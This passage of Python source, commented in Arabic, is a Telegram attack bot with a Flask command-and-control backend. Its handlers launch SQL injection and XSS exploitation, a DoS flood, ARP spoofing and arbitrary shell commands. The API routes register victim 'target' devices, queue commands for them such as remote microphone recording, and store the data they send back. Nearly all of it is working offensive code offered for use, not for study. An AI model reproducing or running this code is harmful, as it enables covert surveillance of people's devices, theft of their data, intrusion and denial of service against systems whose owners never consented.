            msg = f"معلومات Whois لـ {text}:\nالمسجل: {w.registrar}\nالتسجيل: {w.creation_date}\nالانتهاء: {w.expiration_date}\nخوادم DNS: {', '.join(w.name_servers) if w.name_servers else 'غير معروف'}"
            safe_send(chat_id, msg)
        except:
            safe_send(chat_id, "فشل جلب المعلومات.")
        user_states[chat_id] = None
        return
    
    # مسح منافذ (حقيقي)
    if state == "waiting_portscan":
        safe_send(chat_id, f"جاري مسح منافذ {text} ...")
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080]
        open_ports = []
        try:
            ip = socket.gethostbyname(text)
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                sock.close()
            safe_send(chat_id, f"المنافذ المفتوحة: {open_ports}")
        except:
            safe_send(chat_id, "فشل المسح.")
        user_states[chat_id] = None
        return
    
    # فحص SSL (حقيقي)
    if state == "waiting_ssl":
        safe_send(chat_id, f"جاري فحص SSL لـ {text} ...")
        try:
            import ssl
            context = ssl.create_default_context()
            with socket.create_connection((text, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=text) as ssock:
                    cert = ssock.getpeercert()
                    expiry = cert['notAfter']
                    safe_send(chat_id, f"شهادة SSL صالحة حتى: {expiry}")
        except:
            safe_send(chat_id, "فشل فحص SSL.")
        user_states[chat_id] = None
        return
    
    # حقن SQL
    if state == "waiting_sqli_hack":
        result = comprehensive_exploit(text)
        sqli_findings = [e for e in result.get('exploited', []) if e['type'] == 'SQL Injection']
        if sqli_findings:
            msg = "تم العثور على ثغرات SQL Injection:\n"
            for f in sqli_findings:
                msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
            msg += "\nتم استغلالها بنجاح."
        else:
            msg = "لم يتم العثور على ثغرات SQL Injection."
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return
    
    # XSS
    if state == "waiting_xss_hack":
        result = comprehensive_exploit(text)
        xss_findings = [e for e in result.get('exploited', []) if e['type'] == 'XSS']
        if xss_findings:
            msg = "تم العثور على ثغرات XSS:\n"
            for f in xss_findings:
                msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
            msg += "\nتم استغلالها بنجاح."
        else:
            msg = "لم يتم العثور على ثغرات XSS."
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return
    
    # DoS (حقيقي)
    if state == "waiting_dos":
        parts = text.split('|')
        if len(parts) >= 2:
            target = parts[0].strip()
            port = int(parts[1]) if parts[1].isdigit() else 80
            duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
            safe_send(chat_id, f"بدء هجوم DoS على {target}:{port} لمدة {duration} ثانية...")
            result = dos_attack(target, port, duration)
            if result['status'] == 'completed':
                safe_send(chat_id, f"انتهى الهجوم. تم إرسال {result['packets_sent']} حزمة.")
            else:
                safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
        else:
            safe_send(chat_id, "صيغة غير صحيحة.")
        user_states[chat_id] = None
        return
    
    # ARP Spoof (حقيقي - يتطلب صلاحيات root)
    if state == "waiting_arp":
        parts = text.split('|')
        if len(parts) == 2:
            target_ip, gateway_ip = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"بدء هجوم ARP Spoofing على {target_ip} عبر البوابة {gateway_ip} ...")
            result = arp_spoof(target_ip, gateway_ip)
            if result['status'] == 'success':
                safe_send(chat_id, "تم تنفيذ الهجوم بنجاح.")
            else:
                safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
        else:
            safe_send(chat_id, "صيغة غير صحيحة.")
        user_states[chat_id] = None
        return
    
    # Shell (تنفيذ حقيقي)
    if state == "waiting_shell":
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            if len(output) > 4000:
                output = output[:4000] + "\n... (مقطوع)"
            safe_send(chat_id, f"نتيجة الأمر:\n{output}")
        except Exception as e:
            safe_send(chat_id, f"خطأ: {str(e)}")
        user_states[chat_id] = None
        return
    
    # مدة الميكروفون
    if state == "waiting_mic_duration":
        try:
            duration = int(text)
            device_id = admin_remote.get(chat_id)
            if device_id:
                add_command(device_id, f"RECORD_AUDIO:{duration}")
                safe_send(chat_id, f"تم إرسال أمر التسجيل لمدة {duration} ثانية للجهاز {device_id}")
            else:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
        except:
            safe_send(chat_id, "يرجى إدخال رقم صحيح.")
        user_states[chat_id] = None
        return
    
    # بث جماعي
    if state == "waiting_broadcast":
        if not is_admin(chat_id):
            return
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users")
        users = c.fetchall()
        conn.close()
        sent = 0
        for user in users:
            try:
                bot.send_message(user[0], f"رسالة من الإدارة:\n{text}")
                sent += 1
                time.sleep(0.05)
            except:
                pass
        safe_send(chat_id, f"تم إرسال الرسالة لـ {sent} مستخدم.")
        user_states[chat_id] = None
        return
    
    # أي نص آخر
    if state is None:
        safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

# ===================== دوال الأجهزة والأوامر =====================

def add_command(device_id, command):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
              (device_id, command, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ===================== مسارات API =====================

@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO targets (device_id, name, type, ip, os, status, last_seen) VALUES (?, ?, ?, ?, ?, 'online', ?)",
              (device_id, data.get('name', 'Unknown'), data.get('type', 'unknown'), data.get('ip'), data.get('os'), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    notify_admin(f"جهاز جديد متصل: {data.get('name')} ({device_id})")
    return jsonify({'status': 'success'}), 200

@app.route('/get_command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET executed = 1 WHERE id = ?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({'cmd': row[1], 'param': ''}), 200
    conn.close()
    return jsonify({'cmd': '', 'param': ''}), 200

@app.route('/submit_result', methods=['POST'])
def submit_result():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE targets SET last_seen = ?, status = 'online' WHERE device_id = ?", (datetime.now().isoformat(), device_id))
    c.execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
              (device_id, data.get('type', 'unknown'), json.dumps(data.get('data', {})), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'success'}), 200

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

# ===================== بدء التشغيل =====================

if __name__ == '__main__':
    bot.remove_webhook()
    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False)
